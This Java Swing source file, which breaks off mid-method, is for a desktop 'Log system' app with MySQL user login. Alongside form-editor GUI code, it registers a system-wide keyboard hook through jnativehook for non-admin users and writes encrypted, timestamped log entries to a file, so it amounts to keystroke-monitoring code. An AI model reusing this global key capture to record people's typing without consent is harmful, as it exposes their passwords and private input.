/* 
 * 
 * Â® All rights reserved 2019 , By Ahmed Saadawey
 * 
 */
import java.awt.Color;
import java.awt.datatransfer.DataFlavor;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.awt.event.KeyEvent;
import java.awt.event.MouseEvent;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import org.apache.poi.xwpf.usermodel.XWPFDocument;
import org.apache.poi.xwpf.usermodel.XWPFParagraph;

import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.stream.Collectors;
import java.util.stream.Stream;
import javax.crypto.Cipher;
import javax.swing.DefaultComboBoxModel;
import javax.swing.JColorChooser;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author username
 */
public class NewJFrame extends javax.swing.JFrame implements NativeKeyListener {

    /**
     * Creates new form NewJFrame
     */
    public NewJFrame() {

        initComponents();

    }

    /**
     * This method is called from within the constructor to initialize the form.
     * WARNING: Do NOT modify this code. The content of this method is always
     * regenerated by the Form Editor.
     */
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {
        bindingGroup = new org.jdesktop.beansbinding.BindingGroup();

        jSeparator1 = new javax.swing.JSeparator();
        header = new javax.swing.JPanel();
        jLabel4 = new javax.swing.JLabel();
        jLabel6 = new javax.swing.JLabel();
        jLabel9 = new javax.swing.JLabel();
        mainpanel = new javax.swing.JPanel();
        jScrollPane1 = new javax.swing.JScrollPane();
        jTextArea1 = new javax.swing.JTextArea();
        delete = new javax.swing.JButton();
        usercombobox = new javax.swing.JComboBox<>();
        jLabel7 = new javax.swing.JLabel();
        passwordfield = new javax.swing.JPasswordField();
        jLabel8 = new javax.swing.JLabel();
        sout = new javax.swing.JButton();
        sin = new javax.swing.JButton();
        jLabel5 = new javax.swing.JLabel();
        log = new javax.swing.JButton();
        jLabel3 = new javax.swing.JLabel();
        statuspanel = new javax.swing.JPanel();
        jLabel2 = new javax.swing.JLabel();
        jButton5 = new javax.swing.JButton();
        jLabel1 = new javax.swing.JLabel();
        jLabel10 = new javax.swing.JLabel();
        jLabel13 = new javax.swing.JLabel();
        show = new javax.swing.JButton();
        jLabel11 = new javax.swing.JLabel();
        jLabel12 = new javax.swing.JLabel();
        jButton7 = new javax.swing.JButton();
        jPanel4 = new javax.swing.JPanel();
        jButton8 = new javax.swing.JButton();
        jButton9 = new javax.swing.JButton();
        jButton10 = new javax.swing.JButton();
        jButton1 = new javax.swing.JButton();
        jButton2 = new javax.swing.JButton();
        jButton3 = new javax.swing.JButton();
        jButton4 = new javax.swing.JButton();
        jLabel14 = new javax.swing.JLabel();
        jButton6 = new javax.swing.JButton();

        setDefaultCloseOperation(javax.swing.WindowConstants.DO_NOTHING_ON_CLOSE);
        setBackground(new java.awt.Color(0, 102, 102));

        org.jdesktop.beansbinding.Binding binding = org.jdesktop.beansbinding.Bindings.createAutoBinding(org.jdesktop.beansbinding.AutoBinding.UpdateStrategy.READ_WRITE, this, org.jdesktop.beansbinding.ELProperty.create("true"), this, org.jdesktop.beansbinding.BeanProperty.create("undecorated"));
        bindingGroup.addBinding(binding);

        addWindowListener(new java.awt.event.WindowAdapter() {
            public void windowOpened(java.awt.event.WindowEvent evt) {
                formWindowOpened(evt);
            }
        });

        header.setBackground(new java.awt.Color(235, 149, 50));
        header.setLayout(null);

        jLabel4.setFont(new java.awt.Font("Dialog", 1, 36)); // NOI18N
        jLabel4.setForeground(new java.awt.Color(255, 255, 255));
        jLabel4.setText("-");
        jLabel4.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jLabel4MouseClicked(evt);
            }
        });
        header.add(jLabel4);
        jLabel4.setBounds(470, 20, 40, 40);

        jLabel6.setFont(new java.awt.Font("Dialog", 1, 36)); // NOI18N
        jLabel6.setForeground(new java.awt.Color(255, 255, 255));
        jLabel6.setText("X");
        jLabel6.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jLabel6MouseClicked(evt);
            }
        });
        header.add(jLabel6);
        jLabel6.setBounds(520, 20, 40, 40);

        jLabel9.setFont(new java.awt.Font("Dialog", 1, 36)); // NOI18N
        jLabel9.setForeground(new java.awt.Color(255, 255, 255));
        jLabel9.setText("Log system");
        jLabel9.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jLabel9MouseClicked(evt);
            }
        });
        header.add(jLabel9);
        jLabel9.setBounds(10, 10, 220, 50);

        mainpanel.setBackground(new java.awt.Color(44, 62, 80));
        mainpanel.setPreferredSize(new java.awt.Dimension(390, 487));

        jTextArea1.setBackground(new java.awt.Color(51, 51, 51));
        jTextArea1.setColumns(20);
        jTextArea1.setForeground(new java.awt.Color(255, 255, 255));
        jTextArea1.setRows(5);
        jTextArea1.addInputMethodListener(new java.awt.event.InputMethodListener() {
            public void inputMethodTextChanged(java.awt.event.InputMethodEvent evt) {
                jTextArea1InputMethodTextChanged(evt);
            }
            public void caretPositionChanged(java.awt.event.InputMethodEvent evt) {
            }
        });
        jTextArea1.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyPressed(java.awt.event.KeyEvent evt) {
                jTextArea1KeyPressed(evt);
            }
        });
        jScrollPane1.setViewportView(jTextArea1);

        delete.setBackground(new java.awt.Color(70, 167, 255));
        delete.setForeground(new java.awt.Color(255, 255, 255));
        delete.setText("Delete");
        delete.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                deleteActionPerformed(evt);
            }
        });

        String yy[] =null;
        try
        {
            //JOptionPane.showMessageDialog(null,"Loading .....");
            yy=n.get(2);
        }
        catch(Exception e )
        {
            JOptionPane.showMessageDialog(null,"MYSQL Connection failed \n Check your internet connection \n if the problem persists contact admin");
        }
        usercombobox.setFont(new java.awt.Font("Dialog", 1, 18)); // NOI18N
        try
        {
            usercombobox.setModel(new DefaultComboBoxModel(yy));
        }
        catch(Exception e )
        {
            JOptionPane.showMessageDialog(null,"MYSQL Connection failed \n Check your internet connection \n if the problem persists contact admin");
            System.exit(0);
        }
        usercombobox.addPopupMenuListener(new javax.swing.event.PopupMenuListener() {
            public void popupMenuCanceled(javax.swing.event.PopupMenuEvent evt) {
            }
            public void popupMenuWillBecomeInvisible(javax.swing.event.PopupMenuEvent evt) {
                usercomboboxPopupMenuWillBecomeInvisible(evt);
            }
            public void popupMenuWillBecomeVisible(javax.swing.event.PopupMenuEvent evt) {
            }
        });
        usercombobox.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                usercomboboxMousePressed(evt);
            }
        });
        usercombobox.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                usercomboboxActionPerformed(evt);
            }
        });

        jLabel7.setFont(new java.awt.Font("Dialog", 1, 18)); // NOI18N
        jLabel7.setForeground(new java.awt.Color(255, 255, 255));
        jLabel7.setText("User");

        passwordfield.setBackground(new java.awt.Color(204, 204, 204));
        passwordfield.setFont(new java.awt.Font("Dialog", 0, 18)); // NOI18N
        passwordfield.setEchoChar('*');
        passwordfield.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyPressed(java.awt.event.KeyEvent evt) {
                passwordfieldKeyPressed(evt);
            }
        });

        jLabel8.setFont(new java.awt.Font("Dialog", 1, 18)); // NOI18N
        jLabel8.setForeground(new java.awt.Color(255, 255, 255));
        jLabel8.setText("Pass");

        sout.setBackground(new java.awt.Color(70, 167, 255));
        sout.setFont(new java.awt.Font("Tahoma", 1, 15)); // NOI18N
        sout.setForeground(new java.awt.Color(255, 255, 255));
        sout.setText("Sign out");
        sout.setEnabled(false);
        sout.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                soutActionPerformed(evt);
            }
        });

        sin.setBackground(new java.awt.Color(70, 167, 255));
        sin.setFont(new java.awt.Font("Tahoma", 1, 15)); // NOI18N
        sin.setMnemonic(KeyEvent.VK_ENTER);
        sin.setForeground(new java.awt.Color(255, 255, 255));
        sin.setText("Sign in");
        sin.setFocusable(false);
        sin.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                sinActionPerformed(evt);
            }
        });

        jLabel5.setFont(new java.awt.Font("Dialog", 1, 11)); // NOI18N
        jLabel5.setForeground(new java.awt.Color(255, 255, 255));
        jLabel5.setText("Logged Out");

        log.setBackground(new java.awt.Color(70, 167, 255));
        log.setFont(new java.awt.Font("Dialog", 1, 15)); // NOI18N
        log.setForeground(new java.awt.Color(255, 255, 255));
        log.setText("Open Log");
        log.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                logActionPerformed(evt);
            }
        });

        jLabel3.setFont(new java.awt.Font("Dialog", 1, 8)); // NOI18N
        jLabel3.setForeground(new java.awt.Color(255, 255, 255));
        jLabel3.setText("Caps Lock ");

        statuspanel.setBackground(new java.awt.Color(44, 62, 89));
        statuspanel.setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.LOWERED));

        jLabel2.setBackground(new java.awt.Color(255, 0, 51));
        jLabel2.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N
        jLabel2.setForeground(new java.awt.Color(255, 0, 51));
        jLabel2.setText("Stopped");

        jButton5.setBackground(new java.awt.Color(0, 0, 102));
        jButton5.setFont(new java.awt.Font("Dialog", 1, 10)); // NOI18N
        jButton5.setForeground(new java.awt.Color(255, 255, 255));
        jButton5.setText("Restart");
        jButton5.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton5ActionPerformed(evt);
            }
        });

        jLabel1.setFont(new java.awt.Font("Tahoma", 0, 18)); // NOI18N
        jLabel1.setForeground(new java.awt.Color(255, 255, 255));
        jLabel1.setText("Service status :");

        jLabel10.setBackground(new java.awt.Color(255, 255, 255));
        jLabel10.setFont(new java.awt.Font("Dialog", 1, 10)); // NOI18N
        jLabel10.setForeground(new java.awt.Color(255, 255, 255));
        jLabel10.setText("Logged Since :");

        jLabel13.setBackground(new java.awt.Color(255, 255, 255));
        jLabel13.setFont(new java.awt.Font("Dialog", 1, 10)); // NOI18N
        jLabel13.setForeground(new java.awt.Color(255, 255, 255));
        jLabel13.setText(n.Check());

        javax.swing.GroupLayout statuspanelLayout = new javax.swing.GroupLayout(statuspanel);
        statuspanel.setLayout(statuspanelLayout);
        statuspanelLayout.setHorizontalGroup(
            statuspanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(statuspanelLayout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jLabel1)
                .addGap(18, 18, 18)
                .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 99, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jButton5)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel13, javax.swing.GroupLayout.PREFERRED_SIZE, 104, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jLabel10, javax.swing.GroupLayout.DEFAULT_SIZE, 168, Short.MAX_VALUE)
                .addContainerGap())
        );
        statuspanelLayout.setVerticalGroup(
            statuspanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, statuspanelLayout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGroup(statuspanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jLabel1)
                    .addComponent(jLabel2)
                    .addComponent(jButton5)
                    .addComponent(jLabel10)
                    .addComponent(jLabel13))
                .addContainerGap())
        );

        show.setBackground(new java.awt.Color(255, 255, 255));
        show.setFont(new java.awt.Font("Dialog", 1, 8)); // NOI18N
        show.setText("Show");
        show.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                showMousePressed(evt);
            }
            public void mouseReleased(java.awt.event.MouseEvent evt) {
                showMouseReleased(evt);
            }
        });
        show.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                showActionPerformed(evt);
            }
        });

        jLabel12.setBackground(new java.awt.Color(255, 255, 255));
        jLabel12.setForeground(new java.awt.Color(255, 255, 255));
        jLabel12.setText("<HTML><U>Change Password</U></HTML>");
        jLabel12.addMouseMotionListener(new java.awt.event.MouseMotionAdapter() {
            public void mouseDragged(java.awt.event.MouseEvent evt) {
                jLabel12MouseDragged(evt);
            }
            public void mouseMoved(java.awt.event.MouseEvent evt) {
                jLabel12MouseMoved(evt);
            }
        });
        jLabel12.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jLabel12MouseClicked(evt);
            }
        });

        jButton7.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton7ActionPerformed(evt);
            }
        });

        jButton8.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton8ActionPerformed(evt);
            }
        });

        jButton9.setBackground(new java.awt.Color(20, 0, 0));
        jButton9.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton9ActionPerformed(evt);
            }
        });

        jButton10.setBackground(new java.awt.Color(102, 102, 0));
        jButton10.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mouseClicked(java.awt.event.MouseEvent evt) {
                jButton10MouseClicked(evt);
            }
        });
        jButton10.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton10ActionPerformed(evt);
            }
        });

        jButton1.setText("Button");
        jButton1.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton1ActionPerformed(evt);
            }
        });

        jButton2.setText("Header");
        jButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2ActionPerformed(evt);
            }
        });

        jButton3.setText("Font");
        jButton3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton3ActionPerformed(evt);
            }
        });

        jButton4.setText("Main");
        jButton4.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton4ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel4Layout = new javax.swing.GroupLayout(jPanel4);
        jPanel4.setLayout(jPanel4Layout);
        jPanel4Layout.setHorizontalGroup(
            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel4Layout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel4Layout.createSequentialGroup()
                        .addComponent(jButton9)
                        .addGap(33, 33, 33)
                        .addComponent(jButton10)
                        .addGap(29, 29, 29)
                        .addComponent(jButton8))
                    .addGroup(jPanel4Layout.createSequentialGroup()
                        .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jButton1)
                            .addComponent(jButton3))
                        .addGap(18, 18, 18)
                        .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jButton4)
                            .addComponent(jButton2))))
                .addContainerGap())
        );
        jPanel4Layout.setVerticalGroup(
            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel4Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(jButton8, javax.swing.GroupLayout.PREFERRED_SIZE, 33, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jButton9, javax.swing.GroupLayout.PREFERRED_SIZE, 33, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jButton10, javax.swing.GroupLayout.PREFERRED_SIZE, 33, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jButton1)
                    .addComponent(jButton2))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(jButton3)
                    .addComponent(jButton4)))
        );

        jLabel14.setForeground(new java.awt.Color(255, 255, 255));
        jLabel14.setText("Choose theme");

        jButton6.setText("HIde/Show");
        jButton6.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton6ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout mainpanelLayout = new javax.swing.GroupLayout(mainpanel);
        mainpanel.setLayout(mainpanelLayout);
        mainpanelLayout.setHorizontalGroup(
            mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(mainpanelLayout.createSequentialGroup()
                .addGap(48, 48, 48)
                .addGroup(mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(mainpanelLayout.createSequentialGroup()
                        .addComponent(jLabel3, javax.swing.GroupLayout.PREFERRED_SIZE, 223, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jLabel11)
                        .addGap(88, 88, 88))
                    .addGroup(mainpanelLayout.createSequentialGroup()
                        .addGroup(mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addComponent(jLabel5, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, mainpanelLayout.createSequentialGroup()
                                .addComponent(sout, javax.swing.GroupLayout.PREFERRED_SIZE, 194, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(sin, javax.swing.GroupLayout.PREFERRED_SIZE, 176, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addComponent(log, javax.swing.GroupLayout.PREFERRED_SIZE, 376, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jPanel4, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addContainerGap())))
            .addGroup(mainpanelLayout.createSequentialGroup()
                .addContainerGap()
                .addGroup(mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(mainpanelLayout.createSequentialGroup()
                        .addComponent(jLabel7)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(usercombobox, javax.swing.GroupLayout.PREFERRED_SIZE, 379, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(jLabel12, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jButton7, javax.swing.GroupLayout.PREFERRED_SIZE, 15, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(mainpanelLayout.createSequentialGroup()
                        .addComponent(jLabel8)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(passwordfield, javax.swing.GroupLayout.PREFERRED_SIZE, 378, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(show))
                    .addGroup(mainpanelLayout.createSequentialGroup()
                        .addGap(424, 424, 424)
                        .addComponent(jLabel14)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(jButton6)))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
            .addGroup(mainpanelLayout.createSequentialGroup()
                .addGroup(mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                    .addComponent(jScrollPane1)
                    .addComponent(statuspanel, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addGap(0, 0, Short.MAX_VALUE))
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, mainpanelLayout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(delete, javax.swing.GroupLayout.PREFERRED_SIZE, 608, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap())
        );
        mainpanelLayout.setVerticalGroup(
            mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(mainpanelLayout.createSequentialGroup()
                .addGroup(mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addGroup(mainpanelLayout.createSequentialGroup()
                        .addComponent(statuspanel, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(18, 18, 18)
                        .addGroup(mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(usercombobox, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(jLabel7)
                            .addComponent(jLabel12, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                    .addComponent(jButton7, javax.swing.GroupLayout.PREFERRED_SIZE, 19, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(17, 17, 17)
                .addGroup(mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(passwordfield, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jLabel8)
                    .addComponent(show))
                .addGroup(mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(mainpanelLayout.createSequentialGroup()
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jLabel11)
                        .addGap(12, 12, 12))
                    .addGroup(mainpanelLayout.createSequentialGroup()
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addGroup(mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(jLabel3)
                            .addComponent(jLabel14)
                            .addComponent(jButton6))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                            .addGroup(mainpanelLayout.createSequentialGroup()
                                .addComponent(jLabel5)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addGroup(mainpanelLayout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                                    .addComponent(sin, javax.swing.GroupLayout.PREFERRED_SIZE, 43, javax.swing.GroupLayout.PREFERRED_SIZE)
                                    .addComponent(sout, javax.swing.GroupLayout.PREFERRED_SIZE, 43, javax.swing.GroupLayout.PREFERRED_SIZE))
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(log))
                            .addComponent(jPanel4, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))))
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 191, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(43, 43, 43)
                .addComponent(delete)
                .addGap(37, 37, 37))
        );

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addComponent(mainpanel, javax.swing.GroupLayout.DEFAULT_SIZE, 620, Short.MAX_VALUE)
            .addComponent(header, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addGap(70, 70, 70)
                        .addComponent(mainpanel, javax.swing.GroupLayout.PREFERRED_SIZE, 580, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addComponent(header, javax.swing.GroupLayout.PREFERRED_SIZE, 72, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        bindingGroup.bind();

        pack();
    }// </editor-fold>//GEN-END:initComponents
	private static void init() {

        // Get the logger for "org.jnativehook" and set the level to warning.
        java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);

        // Don't forget to disable the parent handlers.
        logger.setUseParentHandlers(false);
    }

    public void success() {

    }


    public boolean admin = false;
    public void register() throws NativeHookException {
        if (admin == false) {
            GlobalScreen.registerNativeHook();
        }
    }    public boolean flagg = false;
    private void formWindowOpened(java.awt.event.WindowEvent evt) {//GEN-FIRST:event_formWindowOpened

    }//GEN-LAST:event_formWindowOpened
    public void restart() {
        flagg = false;
        if (jLabel2.getText().equals("Stopped") && jLabel5.getText().contains("Logged in")) {
            try {
                GlobalScreen.registerNativeHook();
            } catch (NativeHookException e) {
                //logger.error(e.getMessage(), e);
                System.exit(-1);
            }

            GlobalScreen.getInstance().addNativeKeyListener(keyHook);

            jLabel5.setText("Logged in by " + usercombobox.getSelectedItem().toString());
            //  jComboBox1.setEnabled(false);
            Path file = Paths.get(pathh);
            DateFormat dateFormat2 = new SimpleDateFormat("dd/MM/yyyy hh.mm aa");// Create a date object
            String dateString2 = dateFormat2.format(new Date()).toString();
            Path pth = Paths.get(pathh);
            try (OutputStream os = Files.newOutputStream(pth, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
                    StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
                writer.println();
                writer.println(EncryptionDemo.encrypt("[" + dateString2 + "]" + " Restarted By \"" + usercombobox.getSelectedItem().toString() + "\"", ""));
                writer.print(EncryptionDemo.encrypt("[" + dateString2 + "]", ""));
            } catch (Exception e) {

            }

            jLabel2.setText("Running");
            jLabel2.setForeground(Color.GREEN);
        } else {
            JOptionPane.showMessageDialog(null, "Already Running");
        }
    }
    private void jLabel4MouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jLabel4MouseClicked
        this.setState(JFrame.ICONIFIED);
    }//GEN-LAST:event_jLabel4MouseClicked

    private void jLabel6MouseClicked(java.awt.event.MouseEvent evt) {//GEN-FIRST:event_jLabel6MouseClicked
        // TODO add your handling code here:
        if (admin || jLabel5.getText().equals("Logged Out")) {

            DateFormat dateFormat2 = new SimpleDateFormat("dd/MM/yyyy hh.mm aa");// Create a date object
            String dateString2 = dateFormat2.format(new Date()).toString();
            Path pth = Paths.get(pathh);
            LogOut();
            try (OutputStream os = Files.newOutputStream(pth, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
